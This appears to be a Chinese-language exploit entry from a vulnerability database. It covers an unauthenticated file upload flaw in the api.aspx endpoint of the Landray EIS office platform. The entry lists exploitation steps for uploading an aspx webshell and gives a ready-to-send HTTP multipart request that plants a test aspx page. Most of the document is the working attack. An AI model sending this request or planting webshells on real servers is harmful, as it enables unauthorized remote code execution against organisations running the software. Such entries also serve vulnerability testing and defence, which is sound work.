---
id: LANDRAY-EIS-UPLOAD
title: 蓝凌EIS api.aspx 任意文件上传
product: landray-oa
vendor: 深圳蓝凌
version_affected: "EIS"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["蓝凌", "EIS", "api.aspx"]
---

## 漏洞描述

蓝凌EIS 平台 api.aspx 接口存在未授权文件上传漏洞，可上传 aspx webshell。

## 影响版本

- EIS

## 前置条件

- 无需认证

## 利用步骤

1. 构造包含 aspx webshell 的 multipart 文件上传请求
2. 向 `/api.aspx` 接口发送上传请求
3. 根据响应获取上传文件路径，访问 webshell 确认执行

## Payload

```http
POST /api.aspx HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %><%Response.Write("vuln_test");%>
------WebKitFormBoundary--
```

## 验证方法

上传后访问 webshell 路径确认执行。
